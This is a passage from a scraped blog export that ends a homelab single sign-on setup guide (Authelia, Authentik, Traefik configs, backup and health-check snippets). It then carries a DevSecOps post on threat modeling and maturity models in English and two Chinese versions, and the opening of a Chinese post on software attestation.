config&#x2F;configuration.yml authentication_backend: ldap: url: ldap:&#x2F;&#x2F;openldap:389 base_dn: dc&#x3D;homelab,dc&#x3D;local username_attribute: uid additional_users_dn: ou&#x3D;users users_filter: (&amp;(&#123;username_attribute&#125;&#x3D;&#123;input&#125;)(objectClass&#x3D;person)) additional_groups_dn: ou&#x3D;groups groups_filter: (&amp;(member&#x3D;&#123;dn&#125;)(objectClass&#x3D;groupOfNames)) user: cn&#x3D;admin,dc&#x3D;homelab,dc&#x3D;local password: admin_password Configure Authentik with LDAP Directory → Federation &amp; Social → LDAP Sources Create new LDAP source Configure connection details Map attributes Security Best Practices ⚠️ Critical Security MeasuresProtect Your SSO System: SSO is single point of failure - secure it well Use strong admin passwords Enable MFA for all admin accounts Keep software updated Monitor authentication logs Backup configuration regularly Security Checklist: [ ] Strong passwords for all accounts [ ] MFA enabled for admins [ ] HTTPS everywhere (use private CA) [ ] Rate limiting enabled [ ] Failed login notifications [ ] Regular security audits [ ] Backup authentication database [ ] Document recovery procedures [ ] Test account recovery flow [ ] Monitor for suspicious activity Network Security: # Authelia rate limiting regulation: max_retries: 3 find_time: 2m ban_time: 5m Session Security: # Short session timeouts session: expiration: 1h inactivity: 15m Troubleshooting Issue: Redirect Loop Cause: Misconfigured forward auth or session cookies Solution: # Ensure session domain matches session: domain: homelab.local # Must match your domain Issue: “Invalid Redirect URI” Cause: Application redirect URI doesn’t match OIDC config Solution: Check application logs for actual redirect URI, update in IdP. Issue: Users Can’t Access After Login Cause: Missing authorization headers Solution: # Traefik - ensure headers are forwarded - &quot;traefik.http.middlewares.authelia.forwardauth.authResponseHeaders&#x3D;Remote-User,Remote-Groups&quot; Issue: Session Expires Too Quickly Solution: # Increase session duration session: expiration: 12h inactivity: 2h remember_me_duration: 1M Monitoring and Maintenance Log Monitoring # Authelia logs docker logs -f authelia # Watch for failed logins docker logs authelia 2&gt;&amp;1 | grep &quot;authentication failed&quot; Backup Strategy #!&#x2F;bin&#x2F;bash # backup-sso.sh BACKUP_DIR&#x3D;&quot;&#x2F;backups&#x2F;sso&#x2F;$(date +%Y%m%d)&quot; mkdir -p $BACKUP_DIR # Backup Authelia cp -r &#x2F;path&#x2F;to&#x2F;authelia&#x2F;config $BACKUP_DIR&#x2F; cp -r &#x2F;path&#x2F;to&#x2F;authelia&#x2F;secrets $BACKUP_DIR&#x2F; # Backup Authentik database docker exec authentik-postgres pg_dump -U authentik &gt; $BACKUP_DIR&#x2F;authentik.sql echo &quot;Backup completed: $BACKUP_DIR&quot; Health Checks # docker-compose.yml services: authelia: healthcheck: test: [&quot;CMD&quot;, &quot;wget&quot;, &quot;--no-verbose&quot;, &quot;--tries&#x3D;1&quot;, &quot;--spider&quot;, &quot;http:&#x2F;&#x2F;localhost:9091&#x2F;api&#x2F;health&quot;] interval: 30s timeout: 3s retries: 3 Comparison: SSO Solutions Aspect Authelia Authentik Keycloak RAM Usage ~50MB ~500MB ~1GB Setup Time 30 min 1 hour 2+ hours Config Method YAML Web UI Web UI User Storage File/LDAP Database Database/LDAP OIDC Basic Full Full SAML ❌ ✅ ✅ Learning Curve Low Medium High Community Active Very Active Huge Real-World Example: Complete Homelab SSO # Complete docker-compose.yml version: &#39;3.8&#39; services: # Traefik reverse proxy traefik: image: traefik:latest command: - &quot;--providers.docker&#x3D;true&quot; - &quot;--entrypoints.websecure.address&#x3D;:443&quot; ports: - &quot;443:443&quot; volumes: - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock # Authelia SSO authelia: image: authelia&#x2F;authelia:latest volumes: - .&#x2F;authelia&#x2F;config:&#x2F;config - .&#x2F;authelia&#x2F;secrets:&#x2F;secrets labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.authelia.rule&#x3D;Host(&#96;auth.homelab.local&#96;)&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.address&#x3D;http:&#x2F;&#x2F;authelia:9091&#x2F;api&#x2F;verify?rd&#x3D;https:&#x2F;&#x2F;auth.homelab.local&quot; # Nextcloud with SSO nextcloud: image: nextcloud:latest volumes: - nextcloud_data:&#x2F;var&#x2F;www&#x2F;html labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.rule&#x3D;Host(&#96;nextcloud.homelab.local&#96;)&quot; - &quot;traefik.http.routers.nextcloud.middlewares&#x3D;authelia@docker&quot; # Grafana with SSO grafana: image: grafana&#x2F;grafana:latest environment: - GF_AUTH_GENERIC_OAUTH_ENABLED&#x3D;true - GF_AUTH_GENERIC_OAUTH_CLIENT_ID&#x3D;grafana labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.grafana.rule&#x3D;Host(&#96;grafana.homelab.local&#96;)&quot; volumes: nextcloud_data: Resources Authelia Documentation: Complete Authelia guide Authentik Documentation: Authentik setup and config Keycloak Documentation: Enterprise SSO guide OIDC Explained: Understanding OpenID Connect Conclusion Setting up SSO at home transforms your homelab from a collection of separate services into a unified platform. The initial setup investment pays off immediately with convenience and improved security. Key Takeaways: SSO eliminates password fatigue across multiple services Authelia is best for simple setups with reverse proxy Authentik offers full features with beautiful UI Forward authentication protects any service MFA adds critical security layer LDAP integration scales for larger deployments Regular backups are essential (SSO is single point of failure) Homelab SSO is limited to self-hosted services - SaaS integration requires expensive enterprise plans Federation (OIDC/SAML) enables SSO across systems, but WIA is non-federated Quick Start Recommendation: For most homelabs: Start with Authelia + Traefik (simplest path) Use file-based authentication initially Add MFA for admin accounts Gradually migrate services to SSO Consider Authentik if you need OIDC/SAML later Start with 2-3 services, get comfortable with the flow, then expand. Your future self will thank you when you’re not juggling dozens of passwords anymore! 🔐","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"Authentication","slug":"Authentication","permalink":"https://neo01.com/tags/Authentication/"},{"name":"SSO","slug":"SSO","permalink":"https://neo01.com/tags/SSO/"}]},{"title":"DevSecOps - Beyond Tooling to Maturity and Threat Modeling","slug":"2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling","date":"un00fin00","updated":"un00fin00","comments":false,"path":"2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","permalink":"https://neo01.com/2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","excerpt":"Tools aren't the whole answer. Discover how threat modeling and maturity models transform DevSecOps from a toolset into a security culture that protects what matters.","text":"In the fast-evolving landscape of software development, DevSecOps has become a vital framework for integrating security practices into the DevOps process. Yet, many organizations fall into the trap of overemphasizing tooling while neglecting essential organic capabilities like threat modeling, which are crucial for a strong security posture. This blog post delves into the significance of threat modeling in DevSecOps and presents various maturity models to help organizations strengthen their security measures. The Overlooked Value of Threat Modeling Threat modeling is a fundamental capability that is critical for identifying potential security threats early in the software development lifecycle (SDLC). It entails a systematic analysis of potential security vulnerabilities and equips the team to address these issues proactively. Despite its significance, threat modeling is frequently overshadowed by the appeal of automated tools that offer quick solutions and seamless integration into the CI/CD pipeline. The reality is that automated tools, while valuable, cannot replace the nuanced understanding of security risks that threat modeling provides. It requires human insight to anticipate the tactics, techniques, and procedures adversaries might use to compromise a system. By integrating threat modeling into the DevSecOps process, organizations can ensure that security considerations are embedded in the design and architecture of their applications, rather than being an afterthought. Threat Modeling is good, but how? Threat modeling can present challenges, but with a structured approach, it becomes more manageable. Start by understanding what threat modeling entails: it is the process of identifying, assessing, and addressing potential threats to your system. It’s crucial to begin early in the development lifecycle, integrating threat modeling from the outset. Engage diverse stakeholders, including those from security, development, and operations, to gain a comprehensive view of the system and potential threats. Understanding the business context is equally important, as it enables you to align the threat modeling process with your organization’s objectives, risk appetite, and the value of its assets. 🔑 Key Takeaways for Effective Threat Modeling Start early in the development lifecycle Engage diverse stakeholders (security, development, operations) Align with business objectives and risk appetite Use structured methodologies (STRIDE, PASTA) Continuously review and update your threat models Begin with Threat Modeling Diagram A threat model diagram is a visual representation used to identify potential security threats within an application and determine their mitigations. It typically includes elements such as processes, data stores, actors, data flows, and trust boundaries. To draw a threat model diagram, start by identifying the system’s assets, which include data, components, and processes that need protection. Then, define the potential threats to these assets, such as unauthorized access or data leaks. Next, create a Data Flow Diagram (DFD) to visualize how data moves through the system, highlighting points where threats could occur. Finally, analyze the diagram to identify security controls that can mitigate the identified threats. While threat model diagrams can be created with pen and paper, there are tools available that can assist in carrying out threat modeling effectively. OWASP Threat Dragon Microsoft Threat Modeling Tool draw.io flowchart TD A[Identify Assets] --> B[Define Threats] B --> C[Create Data Flow Diagram] C --> D[Analyze Trust Boundaries] D --> E[Apply FrameworkSTRIDE/PASTA] E --> F[Assess Impact & Likelihood] F --> G[Prioritize Threats] G --> H[Define Mitigations] H --> I[Implement Controls] I --> J[Monitor & Review] J --> |Continuous Process| B style A fill:#4CAF50,stroke:#333,stroke-width:2px,color:#fff style H fill:#2196F3,stroke:#333,stroke-width:2px,color:#fff style J fill:#FF9800,stroke:#333,stroke-width:2px,color:#fff Threat Modeling Frameworks Following a structured methodology, such as STRIDE or PASTA, can provide a clear and simple framework for identifying and analyzing threats. Identify your assets and the potential attack vectors that could be exploited by adversaries. Assess the impact and likelihood of each identified threat to prioritize your mitigation strategies effectively. This prioritization helps in focusing efforts on the most critical areas that could impact your business. It’s also important to continuously review and update the threat model to reflect changes in the system or the threat landscape. ⚠️ Threat Modeling is an Ongoing ProcessThreat modeling is not a one-time activity but an ongoing process that evolves with your system and the surrounding threat environment. Regular reviews are essential as new threats emerge and systems change. By adopting these best practices and maintaining a proactive stance, you can overcome the difficulties associated with threat modeling and effectively secure your systems against potential threats. Additionally, threat modeling itself is not a tool; rather, it’s a structured approach for identifying and prioritizing potential threats to a system. However, tools like AWS Threat Composer can aid in the analysis and enhance the threat modeling process. AWS Threat Composer provides examples for both straightforward internet applications and more complex ML operations (MLOps), all integrated with OWASP guidelines. Navigating DevSecOps with Maturity Models Maturity models serve as roadmaps for organizations to assess their current DevSecOps practices and chart a path towards more advanced stages of security integration. One such framework is the OWASP DevSecOps Maturity Model (DSOMM), which outlines security measures that can be applied within DevOps strategies and prioritized accordingly. The DSOMM helps organizations identify gaps in their security practices and provides a structured approach to enhance their DevSecOps initiatives. Implementing a Multistage Approach to DevSecOps Transformation The implementation of DevSecOps is not a one-size-fits-all solution; it requires a tailored approach that considers the unique needs and goals of each organization. A multistage approach to DevSecOps transformation allows organizations to evaluate their progress and maturity during the implementation process. This approach typically includes stages such as initial adoption, automation of security testing, and continuous improvement, each with specific goals and practices to be implemented. Shift left, Stay right, Do right In the realm of DevSecOps, the concepts of “shift left,” “stay right,” and “do right” encapsulate a comprehensive approach to integrating security throughout the software development lifecycle. “Shift left” refers to the practice of incorporating security measures early in the development process, rather than as an afterthought. This proactive stance ensures that security considerations are an integral part of the design and development phases, leading to more secure outcomes from the outset. It’s about embedding security into the developer’s workflow and making it a shared responsibility across the team, rather than relegating it to a separate phase or a specific group of security professionals. “Stay right,” on the other hand, emphasizes the importance of continuous security practices during the operational phase of the software lifecycle. It involves monitoring, protecting, and responding to security threats in real-time, ensuring that security measures are always up-to-date and effective against evolving threats. This approach recognizes that security is not a one-time event but a continuous process that requires vigilance and adaptability as the software is deployed and utilized in production environments. Lastly, “do right” in DevSecOps is a guiding principle that underlines the ethical responsibility of all stakeholders to adhere to best practices in security. It’s a commitment to doing what is necessary to protect data, respect privacy, and ensure the integrity of the software. This includes staying informed about the latest security trends, complying with regulations, and fostering a culture of security within the organization. Together, these principles form a robust framework for integrating security into every stage of the software development and deployment process, aligning with the overarching goal of DevSecOps to build secure software rapidly and efficiently without compromising on quality or performance. By shifting left, staying right, and doing right, organizations can achieve a balance between speed, functionality, and security, which is crucial in today’s fast-paced and threat-laden digital landscape. is crucial in today’s fast-paced and threat-laden digital landscape. Conclusion DevSecOps is more than just a set of tools; it is a culture that requires a balance between automation and organic capabilities like threat modeling. Maturity models provide a valuable framework for organizations to systematically improve their security practices within the DevOps pipeline. By recognizing the importance of threat modeling and utilizing maturity models, organizations can move beyond tool-centric views and develop a comprehensive, resilient security strategy that is woven into the fabric of their software development processes. For those interested in further exploring the intricacies of DevSecOps and threat modeling, additional resources and detailed methodologies can be found through the OWASP Foundation and other industry experts dedicated to enhancing application security.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"DevSecOps","slug":"DevSecOps","permalink":"https://neo01.com/tags/DevSecOps/"}]},{"title":"DevSecOps - 超越工具到成熟度和威胁建模","slug":"2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling-zh-CN","date":"un00fin00","updated":"un00fin00","comments":false,"path":"/zh-CN/2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","permalink":"https://neo01.com/zh-CN/2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","excerpt":"工具不是全部答案。探索威胁建模和成熟度模型如何将DevSecOps从工具集转变为安全文化。","text":"在快速发展的软件开发环境中，DevSecOps 已成为将安全实践集成到 DevOps 流程中的重要框架。然而，许多组织陷入过度强调工具的陷阱，同时忽视了像威胁建模这样的基本有机能力，这对于强大的安全态势至关重要。本文深入探讨威胁建模在 DevSecOps 中的重要性，并提出各种成熟度模型来帮助组织加强其安全措施。 被忽视的威胁建模价值 威胁建模是一项基本能力，对于在软件开发生命周期（SDLC）早期识别潜在安全威胁至关重要。它需要对潜在安全漏洞进行系统分析，并使团队能够主动解决这些问题。尽管其重要性，威胁建模经常被提供快速解决方案并无缝集成到 CI/CD 管道中的自动化工具的吸引力所掩盖。 现实是，自动化工具虽然有价值，但无法取代威胁建模提供的对安全风险的细致理解。它需要人类洞察力来预测对手可能用来危害系统的战术、技术和程序。通过将威胁建模集成到 DevSecOps 流程中，组织可以确保安全考量嵌入到应用程序的设计和架构中，而不是事后才想到。 威胁建模很好，但如何做？ 威胁建模可能会带来挑战，但通过结构化的方法，它变得更易于管理。首先要了解威胁建模的内容：它是识别、评估和解决系统潜在威胁的过程。从开发生命周期的早期开始集成威胁建模至关重要。让来自安全、开发和运营的不同利益相关者参与，以获得系统和潜在威胁的全面视图。 了解业务背景同样重要，因为它使您能够将威胁建模流程与组织的目标、风险偏好和资产价值保持一致。 🔑 有效威胁建模的关键要点 在开发生命周期早期开始 让不同的利益相关者参与（安全、开发、运营） 与业务目标和风险偏好保持一致 使用结构化方法（STRIDE、PASTA） 持续审查和更新您的威胁模型 从威胁建模图开始 威胁模型图是用于识别应用程序内潜在安全威胁并确定其缓解措施的视觉表示。它通常包括流程、数据存储、参与者、数据流和信任边界等元素。 要绘制威胁模型图，首先要识别系统的资产，包括需要保护的数据、组件和流程。然后，定义这些资产的潜在威胁，例如未经授权的访问或数据泄漏。接下来，创建数据流图（DFD）以可视化数据如何在系统中移动，突出显示可能发生威胁的点。最后，分析图表以识别可以缓解已识别威胁的安全控制。 虽然威胁模型图可以用笔和纸创建，但有一些工具可以有效地协助进行威胁建模。 OWASP Threat Dragon Microsoft Threat Modeling Tool draw.io flowchart TD A[识别资产] --> B[定义威胁] B --> C[创建数据流图] C --> D[分析信任边界] D --> E[应用框架STRIDE/PASTA] E --> F[评估影响和可能性] F --> G[优先处理威胁] G --> H[定义缓解措施] H --> I[实施控制] I --> J[监控和审查] J --> |持续流程| B style A fill:#4CAF50,stroke:#333,stroke-width:2px,color:#fff style H fill:#2196F3,stroke:#333,stroke-width:2px,color:#fff style J fill:#FF9800,stroke:#333,stroke-width:2px,color:#fff 威胁建模框架 遵循结构化方法，例如 STRIDE 或 PASTA，可以为识别和分析威胁提供清晰简单的框架。识别您的资产和对手可能利用的潜在攻击向量。 评估每个已识别威胁的影响和可能性，以有效地优先处理您的缓解策略。这种优先顺序有助于将精力集中在可能影响您业务的最关键领域。持续审查和更新威胁模型以反映系统或威胁环境的变化也很重要。 ⚠️ 威胁建模是一个持续的过程威胁建模不是一次性活动，而是随着系统和周围威胁环境演变的持续过程。随着新威胁的出现和系统的变化，定期审查至关重要。 通过采用这些最佳实践并保持主动立场，您可以克服与威胁建模相关的困难，并有效地保护您的系统免受潜在威胁。 此外，威胁建模本身不是一个工具；相反，它是一种用于识别和优先处理系统潜在威胁的结构化方法。然而，像 AWS Threat Composer 这样的工具可以协助分析并增强威胁建模过程。AWS Threat Composer 为简单的互联网应用程序和更复杂的机器学习运营（MLOps）提供示例，所有这些都与 OWASP 指南集成。 使用成熟度模型导航 DevSecOps 成熟度模型作为组织评估其当前 DevSecOps 实践并规划通往更高级安全集成阶段的路线图。其中一个框架是 OWASP DevSecOps 成熟度模型（DSOMM），它概述了可以在 DevOps 策略中应用并相应优先处理的安全措施。DSOMM 帮助组织识别其安全实践中的差距，并提供结构化的方法来增强其 DevSecOps 倡议。 实施 DevSecOps 转型的多阶段方法 DevSecOps 的实施不是一刀切的解决方案；它需要考虑每个组织的独特需求和目标的量身定制方法。DevSecOps 转型的多阶段方法允许组织在实施过程中评估其进度和成熟度。这种方法通常包括初始采用、安全测试自动化和持续改进等阶段，每个阶段都有要实施的特定目标和实践。 左移、右留、做对 在 DevSecOps 领域，“左移”、&quot;右留&quot;和&quot;做对&quot;的概念概括了在整个软件开发生命周期中集成安全性的全面方法。&quot;左移&quot;是指在开发过程的早期纳入安全措施的实践，而不是事后才想到。这种主动立场确保安全考量是设计和开发阶段的组成部分，从一开始就导致更安全的结果。这是关于将安全性嵌入开发者的工作流程，并使其成为整个团队的共同责任，而不是将其归为单独的阶段或特定的安全专业人员群体。 另一方面，&quot;右留&quot;强调在软件生命周期的运营阶段持续安全实践的重要性。它涉及实时监控、保护和响应安全威胁，确保安全措施始终保持最新并有效对抗不断演变的威胁。这种方法认识到安全性不是一次性事件，而是需要警惕和适应性的持续过程，因为软件在生产环境中部署和使用。 最后，DevSecOps 中的&quot;做对&quot;是一个指导原则，强调所有利益相关者遵守安全最佳实践的道德责任。这是对做必要的事情来保护数据、尊重隐私和确保软件完整性的承诺。这包括了解最新的安全趋势、遵守法规，以及在组织内培养安全文化。 这些原则共同形成了一个强大的框架，用于将安全性集成到软件开发和部署过程的每个阶段，与 DevSecOps 的总体目标保持一致，即快速高效地构建安全软件，而不会在质量或性能上妥协。通过左移、右留和做对，组织可以在速度、功能和安全性之间取得平衡，这在当今快节奏和充满威胁的数字环境中至关重要。 结论 DevSecOps 不仅仅是一组工具；它是一种需要在自动化和像威胁建模这样的有机能力之间取得平衡的文化。成熟度模型为组织提供了一个有价值的框架，以系统地改进其在 DevOps 管道中的安全实践。通过认识威胁建模的重要性并利用成熟度模型，组织可以超越以工具为中心的观点，开发一个全面、有弹性的安全策略，融入其软件开发流程的结构中。 对于那些有兴趣进一步探索 DevSecOps 和威胁建模复杂性的人，可以通过 OWASP 基金会和其他致力于增强应用程序安全性的业界专家找到额外的资源和详细方法。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"DevSecOps","slug":"DevSecOps","permalink":"https://neo01.com/tags/DevSecOps/"}],"lang":"zh-CN"},{"title":"DevSecOps - 超越工具到成熟度和威脅建模","slug":"2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling-zh-TW","date":"un00fin00","updated":"un00fin00","comments":false,"path":"/zh-TW/2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","permalink":"https://neo01.com/zh-TW/2024/12/DevSecOps_Beyond_Tooling_to_Maturity_and_Threat_Modeling/","excerpt":"工具不是全部答案。探索威脅建模和成熟度模型如何將DevSecOps從工具集轉變為安全文化。","text":"在快速發展的軟體開發環境中，DevSecOps 已成為將安全實踐整合到 DevOps 流程中的重要框架。然而，許多組織陷入過度強調工具的陷阱，同時忽視了像威脅建模這樣的基本有機能力，這對於強大的安全態勢至關重要。本文深入探討威脅建模在 DevSecOps 中的重要性，並提出各種成熟度模型來幫助組織加強其安全措施。 被忽視的威脅建模價值 威脅建模是一項基本能力，對於在軟體開發生命週期（SDLC）早期識別潛在安全威脅至關重要。它需要對潛在安全漏洞進行系統分析，並使團隊能夠主動解決這些問題。儘管其重要性，威脅建模經常被提供快速解決方案並無縫整合到 CI/CD 管道中的自動化工具的吸引力所掩蓋。 現實是，自動化工具雖然有價值，但無法取代威脅建模提供的對安全風險的細緻理解。它需要人類洞察力來預測對手可能用來危害系統的戰術、技術和程序。通過將威脅建模整合到 DevSecOps 流程中，組織可以確保安全考量嵌入到應用程式的設計和架構中，而不是事後才想到。 威脅建模很好，但如何做？ 威脅建模可能會帶來挑戰，但通過結構化的方法，它變得更易於管理。首先要了解威脅建模的內容：它是識別、評估和解決系統潛在威脅的過程。從開發生命週期的早期開始整合威脅建模至關重要。讓來自安全、開發和營運的不同利益相關者參與，以獲得系統和潛在威脅的全面視圖。 了解業務背景同樣重要，因為它使您能夠將威脅建模流程與組織的目標、風險偏好和資產價值保持一致。 🔑 有效威脅建模的關鍵要點 在開發生命週期早期開始 讓不同的利益相關者參與（安全、開發、營運） 與業務目標和風險偏好保持一致 使用結構化方法（STRIDE、PASTA） 持續審查和更新您的威脅模型 從威脅建模圖開始 威脅模型圖是用於識別應用程式內潛在安全威脅並確定其緩解措施的視覺表示。它通常包括流程、資料儲存、參與者、資料流和信任邊界等元素。 要繪製威脅模型圖，首先要識別系統的資產，包括需要保護的資料、元件和流程。然後，定義這些資產的潛在威脅，例如未經授權的訪問或資料洩漏。接下來，創建資料流圖（DFD）以視覺化資料如何在系統中移動，突出顯示可能發生威脅的點。最後，分析圖表以識別可以緩解已識別威脅的安全控制。 雖然威脅模型圖可以用筆和紙創建，但有一些工具可以有效地協助進行威脅建模。 OWASP Threat Dragon Microsoft Threat Modeling Tool draw.io flowchart TD A[識別資產] --> B[定義威脅] B --> C[創建資料流圖] C --> D[分析信任邊界] D --> E[應用框架STRIDE/PASTA] E --> F[評估影響和可能性] F --> G[優先處理威脅] G --> H[定義緩解措施] H --> I[實施控制] I --> J[監控和審查] J --> |持續流程| B style A fill:#4CAF50,stroke:#333,stroke-width:2px,color:#fff style H fill:#2196F3,stroke:#333,stroke-width:2px,color:#fff style J fill:#FF9800,stroke:#333,stroke-width:2px,color:#fff 威脅建模框架 遵循結構化方法，例如 STRIDE 或 PASTA，可以為識別和分析威脅提供清晰簡單的框架。識別您的資產和對手可能利用的潛在攻擊向量。 評估每個已識別威脅的影響和可能性，以有效地優先處理您的緩解策略。這種優先順序有助於將精力集中在可能影響您業務的最關鍵領域。持續審查和更新威脅模型以反映系統或威脅環境的變化也很重要。 ⚠️ 威脅建模是一個持續的過程威脅建模不是一次性活動，而是隨著系統和周圍威脅環境演變的持續過程。隨著新威脅的出現和系統的變化，定期審查至關重要。 通過採用這些最佳實踐並保持主動立場，您可以克服與威脅建模相關的困難，並有效地保護您的系統免受潛在威脅。 此外，威脅建模本身不是一個工具；相反，它是一種用於識別和優先處理系統潛在威脅的結構化方法。然而，像 AWS Threat Composer 這樣的工具可以協助分析並增強威脅建模過程。AWS Threat Composer 為簡單的網際網路應用程式和更複雜的機器學習營運（MLOps）提供範例，所有這些都與 OWASP 指南整合。 使用成熟度模型導航 DevSecOps 成熟度模型作為組織評估其當前 DevSecOps 實踐並規劃通往更高級安全整合階段的路線圖。其中一個框架是 OWASP DevSecOps 成熟度模型（DSOMM），它概述了可以在 DevOps 策略中應用並相應優先處理的安全措施。DSOMM 幫助組織識別其安全實踐中的差距，並提供結構化的方法來增強其 DevSecOps 倡議。 實施 DevSecOps 轉型的多階段方法 DevSecOps 的實施不是一刀切的解決方案；它需要考慮每個組織的獨特需求和目標的量身定制方法。DevSecOps 轉型的多階段方法允許組織在實施過程中評估其進度和成熟度。這種方法通常包括初始採用、安全測試自動化和持續改進等階段，每個階段都有要實施的特定目標和實踐。 左移、右留、做對 在 DevSecOps 領域，「左移」、「右留」和「做對」的概念概括了在整個軟體開發生命週期中整合安全性的全面方法。「左移」是指在開發過程的早期納入安全措施的實踐，而不是事後才想到。這種主動立場確保安全考量是設計和開發階段的組成部分，從一開始就導致更安全的結果。這是關於將安全性嵌入開發者的工作流程，並使其成為整個團隊的共同責任，而不是將其歸為單獨的階段或特定的安全專業人員群體。 另一方面，「右留」強調在軟體生命週期的營運階段持續安全實踐的重要性。它涉及即時監控、保護和回應安全威脅，確保安全措施始終保持最新並有效對抗不斷演變的威脅。這種方法認識到安全性不是一次性事件，而是需要警惕和適應性的持續過程，因為軟體在生產環境中部署和使用。 最後，DevSecOps 中的「做對」是一個指導原則，強調所有利益相關者遵守安全最佳實踐的道德責任。這是對做必要的事情來保護資料、尊重隱私和確保軟體完整性的承諾。這包括了解最新的安全趨勢、遵守法規，以及在組織內培養安全文化。 這些原則共同形成了一個強大的框架，用於將安全性整合到軟體開發和部署過程的每個階段，與 DevSecOps 的總體目標保持一致，即快速高效地建構安全軟體，而不會在品質或效能上妥協。通過左移、右留和做對，組織可以在速度、功能和安全性之間取得平衡，這在當今快節奏和充滿威脅的數位環境中至關重要。 結論 DevSecOps 不僅僅是一組工具；它是一種需要在自動化和像威脅建模這樣的有機能力之間取得平衡的文化。成熟度模型為組織提供了一個有價值的框架，以系統地改進其在 DevOps 管道中的安全實踐。通過認識威脅建模的重要性並利用成熟度模型，組織可以超越以工具為中心的觀點，開發一個全面、有彈性的安全策略，融入其軟體開發流程的結構中。 對於那些有興趣進一步探索 DevSecOps 和威脅建模複雜性的人，可以通過 OWASP 基金會和其他致力於增強應用程式安全性的業界專家找到額外的資源和詳細方法。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"DevSecOps","slug":"DevSecOps","permalink":"https://neo01.com/tags/DevSecOps/"}],"lang":"zh-TW"},{"title":"以认证为中心的 DevSecOps - 强化企业软件开发","slug":"2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development-zh-CN","date":"un66fin66","updated":"un66fin66","comments":false,"path":"/zh-CN/2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","permalink":"https://neo01.com/zh-CN/2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","excerpt":"供应链攻击激增,团队孤岛作战,工具分散——探索以认证为中心的DevSecOps如何统一企业安全实践。","text":"企业内部对于能够将软件工件追溯回其原始源代码和构建指令的可靠方法的需求日益增长，这是由供应链攻击的增加所驱动的。这种需求也适用于其他常见的企业情境，例如孤立的团队合作和 DevSecOps 实践的多样化。虽然企业通常可以使用市场上广泛的 DevSecOps 工具，但他们采用的工具越多，他们的流程往往变得越分散和孤立。 工具困境：集成过载 一旦企业配备了广泛的 DevSecOps 工具阵列，下一个挑战就是集成它们以最小化分散。市场提供了众多工具，每个都声称是安全挑战的终极解决方案。然而，实际上，没有单一工具可以全面解决所有问题。关键挑战是建立一个凝聚的生态系统，让这些工具和谐运作，确保软件交付的透明和高效管道。 graph TB subgraph Frag[\"传统分散方法\"] Code1[代码仓库] --> Tool1[Snyk] Code1 --> Tool2[Checkmarx] Code1 --> Tool3[Prisma Cloud] Tool1 -.x|手动集成|.-> Portal1[开发者门户] Tool2 -.x|手动集成|.-> Portal1 Tool3 -.x|手动集成|.-> Portal1 Portal1 -.x|分散数据|.-> Team1[安全团队] end Frag -.->|转型| Unified subgraph Unified[\"认证统一方法\"] Code2[代码仓库] --> Att1[Snyk + 认证] Code2 --> Att2[Checkmarx + 认证] Code2 --> Att3[Prisma Cloud + 认证] Att1 -->|签署认证| Store[认证存储] Att2 -->|签署认证| Store Att3 -->|签署认证| Store Store -->|统一视图| Team2[安全团队] end style Tool1 fill:#ff6b6b,stroke:#c92a2a style Tool2 fill:#ff6b6b,stroke:#c92a2a style Tool3 fill:#ff6b6b,stroke:#c92a2a style Portal1 fill:#ffd43b,stroke:#fab005 style Att1 fill:#51cf66,stroke:#2f9e44 style Att2 fill:#51cf66,stroke:#2f9e44 style Att3 fill:#51cf66,stroke:#2f9e44 style Store fill:#4dabf7,stroke:#1971c2 许多企业选择开发自己的开发者门户，集成或使用这些工具的扫描报告，并为开发者和安全工程师提供统一视图。这种方法允许集中管理漏洞、合规性检查和其他安全相关任务。然而，它需要大量投资于开发和维护。如果没有适当的集成和无缝的工作流程，这些工具可能成为开发团队的噩梦。此外，不同的开发团队通常对其软件开发生命周期（SDLC）有不同的工具；例如，移动开发团队可能使用专门的扫描工具。 什么是认证？ 🔐 理解认证认证是一组工具和实践，使 SDLC 中的每个步骤都能在软件工件和产生它们的流程之间建立安全且可验证的连接。这些认证作为防篡改、不可伪造的纸本追踪，详细记录软件创建过程的每个步骤，从代码提交到构建和部署。 认证流程 让我们通过将其分解为易于理解的步骤来探索认证的工作原理： 步骤 1：元数据收集 创建工件认证的过程通常涉及生成加密签署的声明，证明软件构建的来源。这包括以下信息： 与工件相关的工作流程 仓库和组织 环境详细信息 提交 SHA 构建的触发事件 我们将这些信息称为元数据。 步骤 2：加密签署 然后将元数据打包成加密签署的工件认证，可以存储在受信任的仓库中或分发给软件的消费者。这个过程确保软件构建及其相关元数据的来源是可验证和防篡改的。 步骤 3：验证 任何人都可以使用公钥验证认证，确保工件没有被篡改并来自受信任的来源。 区块链连接 🔗 